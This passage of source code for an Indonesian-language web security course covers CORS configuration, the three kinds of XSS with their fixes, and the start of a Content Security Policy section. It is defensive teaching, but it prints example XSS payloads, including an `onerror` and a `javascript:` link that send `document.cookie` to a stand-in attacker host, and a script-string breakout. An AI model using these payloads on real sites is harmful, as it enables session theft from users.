      code(
        'js',
        `
        import cors from 'cors';

        // Origin yang dipercaya, dibaca dari environment, bukan ditulis di kode.
        const ORIGIN_DIIZINKAN = (process.env.CORS_ORIGINS ?? '')
          .split(',')
          .map((nilai) => nilai.trim())
          .filter(Boolean);

        app.use(
          cors({
            origin(origin, callback) {
              // Permintaan tanpa Origin berasal dari curl atau server lain.
              if (!origin) return callback(null, false);
              callback(null, ORIGIN_DIIZINKAN.includes(origin));
            },
            credentials: true,
            methods: ['GET', 'POST', 'PATCH', 'DELETE'],
            allowedHeaders: ['Content-Type', 'Authorization'],
            maxAge: 600,
          }),
        );
        `,
        { filename: 'server/cors.js' },
      ),
      p(
        'Baris yang paling menentukan adalah `ORIGIN_DIIZINKAN.includes(origin)`, karena ia melakukan perbandingan **sama persis** terhadap daftar yang kamu tulis sendiri. Bandingkan dengan bentuk yang sering dijumpai seperti `origin.endsWith(".toko.com")`, yang terlihat aman tetapi meloloskan `https://toko.com.penyerang.id` karena alamat itu memang berakhiran sama.',
      ),
      p(
        'Bahaya pencocokan longgar tidak berhenti pada domain yang mirip. Anggap kamu memakai pola yang meloloskan setiap subdomain `.toko.com`, dan salah satu subdomainmu adalah `promo.toko.com` yang menunjuk layanan pihak ketiga untuk halaman kampanye. Ketika langganan layanan itu berakhir dan catatan DNS-nya lupa dihapus, siapa pun bisa mendaftar di layanan yang sama, mengambil alih subdomain itu, dan sejak saat itu ia berada di dalam daftar origin tepercayamu.',
      ),
      p(
        'Skenario itu disebut pengambilalihan subdomain, dan ia terjadi cukup sering karena catatan DNS berumur panjang sementara langganan layanan tidak. Daftar origin yang ditulis satu per satu tidak punya masalah ini, sebab subdomain yang tidak pernah kamu sebut memang tidak pernah dipercaya, apa pun yang terjadi pada DNS-nya.',
      ),
      p(
        'Perhatikan daftarnya dibaca dari `process.env.CORS_ORIGINS`. Bentuk ini penting karena origin di lingkungan pengembangan berbeda dari produksi. Kalau daftarnya ditulis langsung di kode, `http://localhost:3000` akan ikut terbawa ke produksi, dan satu baris itu memberi izin kepada halaman apa pun yang berjalan di komputer korban.',
      ),
      p(
        'Baris `if (!origin) return callback(null, false)` menangani kasus yang mudah salah. Permintaan tanpa header `Origin` datang dari `curl`, dari server lain, atau dari alat pemantauan. Menolak memberi header CORS kepada mereka **tidak memblokir** permintaannya, karena mereka memang tidak peduli pada CORS. Yang dihindari di sini adalah kebiasaan berbahaya menulis `callback(null, true)` untuk kasus ini, yang lalu ikut meloloskan origin apa pun.',
      ),
      p(
        'Opsi `maxAge: 600` menyuruh browser menyimpan hasil preflight selama sepuluh menit, sehingga satu sesi pemakaian tidak mengirim `OPTIONS` berulang kali. Nilai ini murni soal performa dan tidak melonggarkan keamanan, karena yang di-cache adalah jawaban untuk origin yang sama.',
      ),
      p(
        'Tanpa nilai itu, sebagian browser menyimpan hasilnya hanya beberapa detik, sehingga setiap `DELETE` dan `PATCH` menjadi dua perjalanan jaringan alih-alih satu. Pada halaman yang banyak berinteraksi dengan API, selisihnya terasa sebagai jeda kecil yang muncul di mana-mana tanpa sebab yang jelas.',
      ),
      p(
        'Sisi lain yang perlu diketahui, nilai yang terlalu besar membuat perubahan konfigurasimu lambat terasa. Kalau kamu menambah header baru ke daftar yang diizinkan, browser yang masih menyimpan jawaban lama akan menolak permintaannya sampai simpanan itu kedaluwarsa. Angka sekitar sepuluh menit adalah kompromi yang lazim antara keduanya.',
      ),

      h2('Tiga cara CORS diam-diam menjadi tidak berarti'),
      table(
        ['Bentuk', 'Kenapa terlihat wajar', 'Kenapa berbahaya'],
        [
          [
            '`Access-Control-Allow-Origin: *` bersama `Allow-Credentials: true`',
            'Terlihat seperti mengizinkan semua klien yang sah',
            'Setiap situs bisa memakai cookie korban dan membaca hasilnya. Browser menolak kombinasi ini, dan penolakan itu memang disengaja',
          ],
          [
            'Memantulkan header `Origin` apa adanya',
            'Terlihat dinamis dan rapi',
            'Sama saja dengan tidak punya kebijakan, karena setiap origin akan selalu cocok dengan dirinya sendiri',
          ],
          [
            'Mencocokkan dengan awalan atau wildcard subdomain',
            'Terlihat praktis untuk banyak subdomain',
            'Satu subdomain yang bisa diambil alih orang lain langsung menjadi origin tepercaya',
          ],
        ],
      ),
      p(
        'Ketiga baris itu punya satu akar yang sama, yaitu kebijakan yang **selalu menjawab ya**. Wildcard menjawab ya untuk semua origin, pemantulan menjawab ya untuk origin mana pun yang bertanya, dan pencocokan awalan menjawab ya untuk apa pun yang kebetulan lolos polanya. Kebijakan yang tidak pernah menolak siapa pun bukanlah kebijakan.',
      ),
      p(
        'Ketiganya juga lahir dari situasi yang sama, yaitu seseorang sedang mengejar error CORS yang menghalangi pekerjaannya. Karena itu cara paling ampuh mencegahnya bukan mengingatkan orang agar berhati-hati, melainkan menyediakan konfigurasi yang benar sejak awal proyek sehingga tidak pernah ada momen ketika seseorang harus memilih jalan pintas di bawah tekanan.',
      ),
      code(
        'js',
        `
        // BERBAHAYA: origin dipantulkan tanpa diperiksa.
        app.use((req, res, next) => {
          res.setHeader('Access-Control-Allow-Origin', req.headers.origin);
          res.setHeader('Access-Control-Allow-Credentials', 'true');
          next();
        });

        // AMAN: hanya origin dari daftar yang dipantulkan, dan cache diberi tahu.
        app.use((req, res, next) => {
          const origin = req.headers.origin;
          if (origin && ORIGIN_DIIZINKAN.includes(origin)) {
            res.setHeader('Access-Control-Allow-Origin', origin);
            res.setHeader('Access-Control-Allow-Credentials', 'true');
          }
          res.setHeader('Vary', 'Origin');
          next();
        });
        `,
      ),
      p(
        'Kedua potongan sama-sama memantulkan `req.headers.origin`, jadi bedanya bukan pada teknik itu sendiri. Bedanya ada pada pemeriksaan `ORIGIN_DIIZINKAN.includes(origin)` yang berdiri di depannya. Versi pertama menjawab setiap origin dengan namanya sendiri, sehingga pemeriksaan browser selalu lolos dan kebijakannya kosong dalam praktik.',
      ),
      p(
        'Baris `res.setHeader("Vary", "Origin")` di versi aman mudah dilupakan, padahal ia yang menjaga hasil pemeriksaan tadi tidak bocor lewat cache. Tanpanya, sebuah CDN bisa menyimpan respons yang dibuat untuk origin tepercaya, lalu menyajikan respons yang sama beserta header izinnya kepada origin lain. Pemeriksaanmu tetap benar, tetapi hasilnya dibagikan kepada pihak yang seharusnya ditolak.',
      ),
      p(
        'Perhatikan juga versi aman **tidak memasang header apa pun** ketika origin tidak dikenal, alih-alih memasang header penolakan. Itu memang perilaku yang benar, karena CORS bekerja dengan cara memberi izin. Tidak adanya header izin sudah berarti browser akan menolak pembacaannya.',
      ),

      h2('Laravel dan Next.js'),
      code(
        'php',
        `
        // config/cors.php
        return [
            'paths' => ['api/*'],
            'allowed_methods' => ['GET', 'POST', 'PATCH', 'DELETE'],
            'allowed_origins' => explode(',', env('CORS_ORIGINS', '')),
            'allowed_origins_patterns' => [],
            'allowed_headers' => ['Content-Type', 'Authorization'],
            'supports_credentials' => true,
        ];
        `,
        { filename: 'config/cors.php' },
      ),
      p(
        'Perhatikan `allowed_origins_patterns` sengaja dibiarkan kosong. Kunci itu menerima ekspresi reguler, dan ekspresi reguler untuk mencocokkan domain sangat mudah ditulis dengan cara yang terlalu longgar, misalnya lupa menambatkan akhirannya sehingga `toko.com.penyerang.id` ikut cocok. Selama daftar origin eksplisit masih memungkinkan, itulah bentuk yang dipakai.',
      ),
      p(
        'Kunci `paths` yang berisi `api/*` juga bukan sekadar detail. Ia membatasi CORS hanya pada rute API, sehingga halaman biasa yang dirender server tidak ikut mengirim header izin lintas origin. Semakin sempit jangkauan sebuah izin, semakin kecil kemungkinan ia dipakai di tempat yang tidak kamu maksudkan.',
      ),
      ol(
        'Tulis daftar origin persis, dan baca dari environment.',
        'Jangan pernah memasangkan `*` dengan `credentials: true`.',
        'Jangan memantulkan `Origin` tanpa memeriksanya lebih dulu.',
        'Pasang `Vary: Origin` agar cache tidak membocorkan hasil pemeriksaan.',
        'Sebutkan metode dan header yang benar-benar dipakai saja.',
        'Jaga origin pengembangan tidak ikut ke konfigurasi produksi.',
      ),

      references(
        {
          label: 'Cross-Origin Resource Sharing (CORS)',
          href: 'https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS',
          source: 'MDN',
          note: 'Penjelasan lengkap preflight, simple request, dan setiap header CORS.',
        },
        {
          label: 'Same-origin policy',
          href: 'https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy',
          source: 'MDN',
          note: 'Aturan dasar yang dilonggarkan CORS, termasuk apa saja yang dikecualikan.',
        },
        {
          label: 'Access-Control-Allow-Credentials',
          href: 'https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Access-Control-Allow-Credentials',
          source: 'MDN',
          note: 'Menyebut langsung bahwa nilai `*` tidak berlaku ketika kredensial disertakan.',
        },
        {
          label: 'Fetch Standard: CORS protocol',
          href: 'https://fetch.spec.whatwg.org/#http-cors-protocol',
          source: 'WHATWG',
          note: 'Spesifikasi asli yang mendefinisikan perilaku yang diikuti semua browser.',
        },
        {
          label: 'Vary',
          href: 'https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Vary',
          source: 'MDN',
          note: 'Kenapa cache membutuhkan header ini agar tidak menyajikan respons ke origin yang salah.',
        },
      ),
    ],
  ),

  written(
    'xss',
    'XSS: Stored, Reflected, dan DOM-based',
    14,
    'Ketika teks dari pengguna berubah menjadi kode yang dijalankan browser.',
    [
      p(
        'XSS terjadi ketika data yang seharusnya ditampilkan sebagai **teks** malah dibaca browser sebagai **kode**. Bentuknya persis sama dengan injeksi SQL, hanya berpindah tempat. Kalau di SQL data berubah menjadi perintah database, di sini data berubah menjadi JavaScript yang berjalan di halaman korban dengan hak akses penuh sebagai korban.',
      ),
      p(
        'Kata "hak akses penuh sebagai korban" perlu dibayangkan sungguh-sungguh, karena di situlah letak bahayanya. Skrip yang berhasil disisipkan berjalan di dalam origin situsmu, jadi ia bisa membaca isi halaman, mengubahnya, memanggil API-mu dengan sesi korban, dan mengirim hasilnya ke mana pun.',
      ),

      terms(
        {
          term: 'XSS',
          meaning:
            'Singkatan dari **Cross-Site Scripting**. Huruf depannya X supaya tidak tertukar dengan CSS. Artinya penyerang berhasil menjalankan JavaScript pilihannya di dalam halaman milikmu, sehingga skrip itu dianggap browser sebagai bagian sah dari situsmu.',
        },
        {
          term: 'stored XSS',
          meaning:
            'Payload berbahaya **tersimpan di database** lalu tampil kepada setiap orang yang membuka halaman itu. Contohnya komentar, nama profil, atau deskripsi produk. Ini varian paling parah karena satu kali penyisipan bisa mengenai ribuan pembaca tanpa penyerang berbuat apa-apa lagi.',
        },
        {
          term: 'reflected XSS',
          meaning:
            'Payload berada **di dalam URL** lalu dipantulkan kembali ke halaman, misalnya pada halaman hasil pencarian yang menampilkan kata kuncinya. Korban harus mengeklik tautan buatan penyerang lebih dulu, jadi penyebarannya lewat pesan, email, atau iklan.',
        },
        {
          term: 'DOM-based XSS',
          meaning:
            'Payload tidak pernah menyentuh server sama sekali. Semuanya terjadi di browser ketika JavaScript membaca sesuatu dari URL atau penyimpanan lokal, lalu menuliskannya ke halaman. Karena server tidak pernah melihatnya, log server sama sekali bersih dan varian ini paling sulit terdeteksi.',
        },
        {
          term: 'sink',
          meaning:
            'Titik di kode tempat sebuah nilai **berubah menjadi HTML atau kode** yang dieksekusi. Contohnya `innerHTML`, `dangerouslySetInnerHTML`, `document.write`, dan `eval`. Mencari kerentanan XSS pada dasarnya adalah mencari sink lalu menelusuri dari mana nilainya datang.',
        },
        {
          term: 'escaping (output encoding)',
          meaning:
            'Mengubah karakter yang punya arti khusus menjadi bentuk yang aman ditampilkan, misalnya `<` menjadi `&lt;`. Setelah diubah, browser menampilkannya sebagai huruf biasa alih-alih membacanya sebagai awal tag. Ini pertahanan utamanya, dan sebagian besar framework modern melakukannya otomatis.',
        },
        {
          term: 'sanitization (sanitasi)',
          meaning:
            'Membuang bagian berbahaya dari HTML sambil mempertahankan bagian yang aman. Berbeda dari escaping, karena hasil sanitasi memang tetap ditampilkan sebagai HTML. Hanya dipakai ketika kamu benar-benar butuh menampilkan HTML dari pengguna, misalnya pada editor teks kaya.',
        },
        {
          term: '`textContent` dan `innerHTML`',
          meaning:
            'Dua cara mengisi elemen yang terlihat mirip tetapi berbeda arti. `textContent` memasukkan nilainya sebagai **teks apa adanya**, sedangkan `innerHTML` mengurai nilainya sebagai **HTML**. Mengganti satu dengan yang lain adalah perbaikan XSS paling sering dipakai sekaligus paling murah.',
        },
        {
          term: '`dangerouslySetInnerHTML`',
          meaning:
            'Cara React menampilkan HTML mentah. Namanya memang dibuat panjang dan menakutkan supaya tidak dipakai tanpa sadar, dan supaya mudah dicari di seluruh proyek. Setiap kemunculannya adalah tempat yang wajib ditinjau.',
        },
        {
          term: 'DOMPurify',
          meaning:
            'Library sanitasi HTML yang paling banyak dipakai. Ia mengurai HTML memakai parser browser lalu membuang tag dan atribut yang tidak ada di daftar amannya. Dipakai karena menulis sanitizer sendiri hampir selalu gagal menutup semua kasus tepi.',
        },
      ),

      h2('Tiga jalur masuk, satu akibat'),
      table(
        ['Varian', 'Payload disimpan di', 'Korban terkena saat', 'Terlihat di log server?'],
        [
          ['Stored', 'Database', 'Membuka halaman biasa', 'Ya, saat penyisipan'],
          ['Reflected', 'URL', 'Mengeklik tautan buatan penyerang', 'Ya, di query string'],
          [
            'DOM-based',
            'URL atau penyimpanan browser',
            'Membuka halaman dengan URL tertentu',
            'Sering tidak, terutama bila payload-nya ada setelah tanda pagar',
          ],
        ],
      ),
      p(
        'Kolom terakhir baris ketiga menjelaskan kenapa DOM-based XSS begitu licin. Bagian URL setelah tanda pagar, misalnya `#nama=<img src=x onerror=...>`, **tidak pernah dikirim browser ke server**. Artinya tidak ada satu pun baris log yang menyimpan bukti serangannya, dan pemindai yang bekerja dari sisi server tidak akan menemukan apa-apa.',
      ),
      code(
        'js',
        `
        // Halaman sambutan yang menyapa pengunjung dengan namanya.
        const nama = new URLSearchParams(location.search).get('nama');
        document.getElementById('sapaan').innerHTML = 'Halo, ' + nama;

        // Penyerang membagikan tautan ini:
        // https://toko.com/sambutan?nama=<img src=x onerror="fetch('https://penyerang.id?c='+document.cookie)">
        `,
      ),
      p(
        'Dua baris pertama adalah kode yang sangat lazim ditulis, dan keduanya sudah cukup untuk membuka lubang penuh. Nilai `nama` datang dari URL yang sepenuhnya dikendalikan pengirim tautan, lalu mendarat di `innerHTML` yang memang bertugas mengurai teks sebagai HTML. Tidak ada satu baris pun yang salah secara sintaks, dan itulah sebabnya kerentanan ini lolos dari tinjauan biasa.',
      ),
      p(
        'Perhatikan payload-nya memakai `<img src=x onerror=...>` alih-alih `<script>`. Bentuk itu dipilih karena tag `script` yang dimasukkan lewat `innerHTML` memang tidak dijalankan browser, sehingga banyak orang menyimpulkan `innerHTML` sudah aman. Kesimpulan itu keliru, sebab atribut penanganan kejadian seperti `onerror` tetap berjalan. Nilai `src=x` sengaja dibuat menunjuk berkas yang tidak ada supaya `onerror` pasti terpicu.',
      ),
      p(
        'Perbaikannya satu kata, yaitu mengganti `innerHTML` menjadi `textContent`. Sesudah diganti, payload yang sama akan tampil di layar sebagai tulisan `<img src=x onerror=...>` dan tidak ada yang dijalankan. Kalau nama pengunjung memang perlu dicetak tebal, bangun elemennya dengan `createElement` lalu isi teksnya, jangan merangkai HTML sebagai string.',
      ),
      p(
        'Meski jalannya berbeda, akibat ketiganya identik, yaitu JavaScript pilihan penyerang berjalan di origin situsmu. Karena itu pertahanannya juga sama, yaitu memastikan nilai dari luar tidak pernah sampai ke sink dalam bentuk HTML.',
      ),

      h2('Framework modern sudah aman secara bawaan'),
      code(
        'jsx',
        `
        // Aman. React meng-escape isinya sebelum dimasukkan ke DOM.
        function Komentar({ isi }) {
          return <p>{isi}</p>;
        }

        // isi = '<img src=x onerror="fetch('https://penyerang.id?c='+document.cookie)">'
        // Yang tampil di layar adalah teks tag itu, bukan gambar dan bukan skrip.
        `,
      ),
      p(
        'Kurung kurawal `{isi}` di JSX bukan sekadar cara menyisipkan nilai, melainkan juga titik tempat React melakukan escaping. Berapa pun panjang dan berbahayanya isi variabel itu, React memasukkannya sebagai teks, sehingga `<img>` tampil sebagai tulisan `<img>` di layar dan atribut `onerror` di dalamnya tidak pernah menjadi atribut sungguhan.',
      ),
      p(
        'Yang dilakukan React di titik itu sebenarnya sederhana, yaitu mengubah lima karakter yang punya arti khusus di HTML menjadi bentuk entitasnya. Tanda `<` menjadi `&lt;`, tanda `>` menjadi `&gt;`, ampersand menjadi `&amp;`, dan kedua jenis tanda kutip menjadi bentuk entitasnya masing-masing. Sesudah diubah, browser tidak punya cara membaca teks itu sebagai awal sebuah tag.',
      ),
      p(
        'Perlu diketahui juga bahwa React tidak menyimpan hasil escaping itu ke database. Yang tersimpan tetap teks aslinya, dan pengubahan terjadi setiap kali komponen dirender. Bentuk ini disengaja dan lebih baik, sebab data yang sama bisa dipakai di tempat lain yang aturannya berbeda, misalnya dikirim sebagai email teks biasa atau diekspor ke berkas CSV.',
      ),
      p(
        'Perilaku yang sama berlaku di Blade milik Laravel lewat `{{ $isi }}`, di Vue lewat interpolasi biasa, dan di banyak template engine lain. Karena itu, aplikasi yang ditulis dengan framework modern dan tanpa trik tambahan biasanya sudah bebas XSS pada jalur normalnya. Masalahnya selalu muncul di tempat seseorang sengaja keluar dari jalur itu.',
      ),

      h2('Empat pintu yang membatalkannya'),
      code(
        'jsx',
        `
        // 1. React
        <div dangerouslySetInnerHTML={{ __html: isiDariPengguna }} />

        // 2. DOM langsung
        elemen.innerHTML = isiDariPengguna;

        // 3. Atribut yang bisa berisi kode
        <a href={tautanDariPengguna}>Buka</a>   // href="javascript:..."
        <img src={sumberDariPengguna} />

        // 4. Blade dan Vue
        // {!! $isi !!}   dan   v-html="isi"
        `,
      ),
      p(
        'Keempatnya punya satu kesamaan, yaitu semuanya adalah cara **meminta** browser membaca nilai sebagai HTML atau kode. Tidak satu pun dari keempatnya bug pada frameworknya. Semuanya bekerja persis seperti yang dijanjikan dokumentasinya, dan justru itulah masalahnya ketika nilai yang diberikan berasal dari luar.',
      ),
      p(
        'Nomor tiga paling sering terlewat karena tidak terlihat seperti menampilkan HTML. Atribut `href` menerima skema `javascript:`, jadi tautan bernilai `javascript:fetch("https://penyerang.id?c="+document.cookie)` akan menjalankan kode saat diklik. Perbaikannya adalah memeriksa skema tautannya sebelum dipakai.',
      ),
      p(
        'Atribut `src` punya masalah yang mirip meski jalurnya berbeda. Nilai `src` pada tag `img` yang menunjuk alamat penyerang akan memberi tahu penyerang kapan halaman itu dibuka dan dari alamat IP mana, sekaligus mengirimkan header `Referer` yang bisa memuat id di dalam URL halamanmu. Untuk tag `iframe` dan `object`, nilai `src` bahkan bisa memuat halaman utuh milik penyerang di dalam halamanmu.',
      ),
      p(
        'Berkas SVG layak disebut tersendiri karena ia sering dianggap gambar biasa. SVG sebenarnya adalah dokumen XML yang boleh memuat tag `script`, sehingga berkas SVG yang diunggah pengguna lalu ditampilkan langsung dari origin situsmu bisa menjalankan JavaScript penuh. Ini juga alasan sub-bab 3.3 menyarankan menyajikan unggahan dengan `Content-Disposition: attachment`.',
      ),
      code(
        'ts',
        `
        const SKEMA_AMAN = new Set(['http:', 'https:', 'mailto:']);

        export function tautanAman(nilai: string): string {
          try {
            const url = new URL(nilai, 'https://situsku.com');
            return SKEMA_AMAN.has(url.protocol) ? url.href : '#';
          } catch {
            return '#';
          }
        }
        `,
        { filename: 'lib/tautan-aman.ts' },
      ),
      p(
        'Fungsi ini memakai `new URL` alih-alih memeriksa teksnya dengan pencocokan pola. Bedanya penting, karena parser URL bawaan browser sudah menangani seluruh bentuk aneh yang biasa dipakai untuk menyamarkan skema, misalnya huruf besar kecil bercampur, spasi di depan, atau karakter kendali di tengah kata `javascript`.',
      ),
      p(
        'Argumen kedua `https://situsku.com` adalah alamat dasar, yang membuat tautan relatif seperti `/produk/7` tetap sah dan tidak ikut ditolak. Blok `catch` menangani nilai yang bahkan bukan URL, dan keduanya berakhir mengembalikan `#` sehingga tautannya menjadi tidak berbahaya alih-alih membuat halaman gagal dirender.',
      ),

      h2('Kalau HTML memang harus ditampilkan'),
      p(
        'Ada kasus sah tempat pengguna memang perlu mengirim HTML, misalnya editor teks kaya pada aplikasi blog. Untuk kasus itu, jawabannya adalah sanitasi, dan sanitasi harus dilakukan **di server** meski editornya berada di browser.',
      ),
      code(
        'ts',
        `
        import createDOMPurify from 'dompurify';
        import { JSDOM } from 'jsdom';

        const purify = createDOMPurify(new JSDOM('').window);

        export function bersihkanHtml(kotor: string): string {
          return purify.sanitize(kotor, {
            ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'ul', 'ol', 'li', 'a', 'code'],
            ALLOWED_ATTR: ['href', 'title'],
            ALLOWED_URI_REGEXP: /^https?:\\/\\//i,
          });
        }
        `,
        { filename: 'server/bersihkan-html.ts' },
      ),
      p(
        'Perhatikan bentuk konfigurasinya berupa daftar **yang diizinkan**, bukan daftar yang dilarang. Menyebutkan tag berbahaya satu per satu tidak akan pernah selesai, karena selalu ada tag, atribut, atau kombinasi baru yang belum masuk daftar. Menyebutkan sepuluh tag yang boleh justru menutup semua sisanya sekaligus.',
      ),
      p(
        'Baris `ALLOWED_URI_REGEXP` menutup celah yang tersisa setelah tag dibatasi. Tag `a` ada di daftar yang diizinkan, dan tanpa pembatasan ini nilai `href` masih boleh berisi `javascript:`. Pola tersebut memastikan hanya `http` dan `https` yang lolos.',
      ),
      p(
        'Alasan sanitasi dijalankan di server juga perlu ditegaskan. Sanitasi di browser hanya melindungi pengguna yang memakai halamanmu, sedangkan penyerang mengirim datanya langsung ke API dengan `curl` tanpa pernah membuka halamanmu. Kalau pembersihannya hanya ada di browser, payload berbahaya tetap masuk ke database lalu tampil ke semua orang.',
      ),
      p(
        'Ada satu keputusan lanjutan yang perlu diambil sadar, yaitu membersihkan saat menyimpan atau saat menampilkan. Membersihkan saat menyimpan lebih hemat karena dikerjakan sekali untuk ribuan kali tampil, tetapi ia mengunci hasilnya. Kalau kemudian ditemukan celah pada aturan sanitasimu, data yang sudah terlanjur tersimpan tetap membawa payload lama.',
      ),
      p(
        'Membersihkan saat menampilkan memberi kelenturan sebaliknya, sebab memperbaiki aturan sanitasi langsung berlaku untuk seluruh data lama tanpa migrasi apa pun. Harganya adalah pekerjaan yang berulang di setiap permintaan. Jalan tengah yang banyak dipakai adalah menyimpan teks asli sebagai source of truth, menyimpan hasil bersihnya sebagai kolom tambahan untuk ditampilkan, lalu menghitung ulang kolom itu ketika aturannya berubah.',
      ),
      callout(
        'danger',
        'Sanitasi di klien bukan pertahanan',
        'Data berbahaya masuk lewat API, bukan lewat halamanmu. Bersihkan di server sebelum menyimpan, dan tampilkan kembali dengan escaping bawaan framework. Sanitasi di browser hanya berguna untuk pratinjau, bukan sebagai penjaga.',
      ),

      h2('Escaping mengikuti konteksnya'),
      p(
        'Satu hal yang jarang disadari, escaping bukan operasi tunggal. Karakter yang berbahaya berbeda-beda tergantung di bagian mana halaman nilai itu diletakkan.',
      ),
      table(
        ['Konteks', 'Contoh', 'Yang harus dilakukan'],
        [
          [
            'Isi elemen',
            '`<p>DI SINI</p>`',
            'Escaping HTML, dan ini yang dilakukan framework secara bawaan',
          ],
          [
            'Nilai atribut',
            '`<div title="DI SINI">`',
            'Escaping HTML plus tanda kutip yang selalu dipasang',
          ],
          [
            'Di dalam `<script>`',
            '`const x = "DI SINI"`',
            'Jangan pernah menyisipkan ke sini, pakai `JSON.stringify` atau kirim lewat atribut data',
          ],
          ['Nilai `href` atau `src`', '`<a href="DI SINI">`', 'Periksa skemanya dengan allow-list'],
          [
            'Di dalam CSS',
            '`style="width: DI SINI"`',
            'Jangan menyisipkan nilai dari pengguna ke CSS',
          ],
        ],
      ),
      p(
        'Baris ketiga adalah yang paling sering dilanggar, biasanya saat seseorang ingin menurunkan data dari server ke JavaScript halaman. Escaping HTML tidak menolong di dalam blok `<script>`, karena di sana yang berlaku adalah aturan JavaScript, bukan aturan HTML. Satu tanda kutip yang lolos sudah cukup untuk keluar dari string dan menulis kode baru.',
      ),
      code(
        'html',
        `
        <!-- RENTAN: nilai disisipkan ke dalam kode JavaScript. -->
        <script>
          const namaPengguna = "DI SINI";
        </script>

        <!-- Nilai penyerang: ";alert(document.cookie);// -->
        <!-- Hasilnya: const namaPengguna = "";alert(document.cookie);//"; -->
        `,
      ),
      p(
        'Perhatikan payload-nya tidak memuat satu pun karakter `<` atau `>`, sehingga escaping HTML tidak akan mengubah apa pun di dalamnya. Yang dipakai hanyalah tanda kutip untuk menutup string lebih awal, titik koma untuk memulai pernyataan baru, dan dua garis miring untuk mengomentari sisa barisnya supaya tidak menimbulkan error sintaks.',
      ),
      p(
        'Bentuk amannya memakai atribut data seperti berikut, yaitu `<div id="konfig" data-nama="DI SINI">`, lalu JavaScript membacanya dengan `document.getElementById("konfig").dataset.nama`. Nilainya kini melewati jalur atribut HTML yang memang di-escape framework, dan ia tidak pernah menjadi bagian dari kode sumber skripmu.',
      ),
      p(
        'Cara yang aman untuk kasus itu adalah menaruh datanya di atribut `data-` lalu membacanya dengan `JSON.parse` dari JavaScript. Dengan begitu nilainya melewati jalur atribut yang sudah di-escape sebagai HTML, dan tidak pernah menjadi bagian dari kode sumber skripmu.',
      ),

      h2('Ringkas pertahanannya'),
      ol(
        'Andalkan escaping bawaan framework, dan jangan keluar dari jalur itu tanpa alasan.',
        'Perlakukan setiap `dangerouslySetInnerHTML`, `innerHTML`, `v-html`, dan `{!! !!}` sebagai temuan yang wajib ditinjau.',
        'Periksa skema pada setiap nilai `href` dan `src` yang berasal dari pengguna.',
        'Kalau HTML memang dibutuhkan, sanitasi di server dengan daftar tag yang diizinkan.',
        'Pasang Content Security Policy sebagai lapis kedua, yang dibahas di sub-bab berikutnya.',
        'Simpan token sesi di cookie `HttpOnly` supaya skrip yang lolos tidak bisa membacanya.',
      ),
      p(
        'Poin terakhir sering diabaikan, padahal ia yang menentukan seberapa parah akibat sebuah XSS. Token yang disimpan di `localStorage` bisa dibaca JavaScript mana pun di halaman itu, termasuk skrip penyerang. Cookie bertanda `HttpOnly` tidak bisa dibaca JavaScript sama sekali, sehingga XSS yang berhasil pun tidak langsung berubah menjadi pencurian sesi.',
      ),

      references(
        {
          label: 'Cross-site scripting (XSS)',
          href: 'https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/XSS',
          source: 'MDN',
          note: 'Penjelasan tiga varian beserta contoh payload-nya.',
        },
        {
          label: 'Cross Site Scripting Prevention Cheat Sheet',
          href: 'https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html',
          source: 'OWASP',
          note: 'Aturan escaping per konteks, sumber tabel konteks di sub-bab ini.',
        },
        {
          label: 'DOM based XSS Prevention Cheat Sheet',
          href: 'https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html',
          source: 'OWASP',
          note: 'Daftar sink berbahaya di DOM dan cara menghindarinya.',
        },
        {
          label: 'dangerouslySetInnerHTML',
          href: 'https://react.dev/reference/react-dom/components/common#dangerously-setting-the-inner-html',
          source: 'React',
          note: 'Penjelasan resmi kenapa namanya sengaja dibuat menakutkan.',
        },
        {
          label: 'Element: innerHTML property',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML',
          source: 'MDN',
          note: 'Bagian Security considerations menjelaskan batas perlindungan bawaannya.',
        },
      ),
    ],
  ),

  written(
    'content-security-policy',
    'Content Security Policy',
    13,
    'Jaring pengaman ketika satu escaping terlewat.',
    [
      p(
        'Escaping menutup celah XSS, tetapi escaping dijalankan manusia dan manusia sesekali lupa. Content Security Policy adalah lapis kedua yang mengasumsikan hal itu memang akan terjadi. Tugasnya bukan mencegah skrip disisipkan, melainkan memastikan skrip yang berhasil disisipkan **tidak boleh dijalankan browser**.',
      ),
      p(
        'Perbedaan tugas itu penting supaya harapanmu tepat. CSP tidak memperbaiki kode yang rentan, dan situs dengan CSP ketat tetap perlu escaping yang benar. Yang diberikan CSP adalah pengurangan akibat, dari pencurian sesi menjadi sekadar baris error di Console.',
      ),

      terms(
        {
          term: 'CSP',
          meaning:
            'Singkatan dari **Content Security Policy**. Sebuah header respons HTTP berisi daftar aturan tentang sumber mana yang boleh memuat skrip, gaya, gambar, dan sumber daya lain di halaman itu. Browser yang menerimanya akan menolak apa pun di luar daftar tersebut.',
        },
        {
          term: 'directive',
          meaning:
            'Satu aturan di dalam CSP, misalnya `script-src` untuk skrip dan `img-src` untuk gambar. Ditulis berpasangan dengan daftar sumber yang diizinkan, lalu dipisahkan titik koma dari directive berikutnya.',
        },
        {
          term: '`self`',
          meaning:
            "Nilai khusus yang berarti origin halaman itu sendiri. Ditulis dengan tanda kutip tunggal di dalam header, yaitu `'self'`. Tanda kutip itu wajib, dan menghilangkannya membuat browser membacanya sebagai nama host bernama self.",
        },
        {
          term: '`unsafe-inline`',
          meaning:
            'Nilai yang mengizinkan skrip dan gaya yang ditulis langsung di dalam HTML. Namanya memuat kata unsafe karena memang begitulah akibatnya, sebab skrip sisipan penyerang juga berupa skrip inline. Memasangnya pada `script-src` membuat CSP tidak lagi melindungi dari XSS.',
        },
        {
          term: 'nonce',
          meaning:
            'Singkatan dari **number used once**, yaitu nilai acak yang dibuat ulang pada **setiap permintaan**. Nilai itu dicantumkan di header CSP sekaligus di atribut `nonce` pada tag skrip milikmu. Skrip tanpa nonce yang cocok akan ditolak, dan penyerang tidak bisa menebaknya karena nilainya berubah terus.',
        },
        {
          term: 'hash',
          meaning:
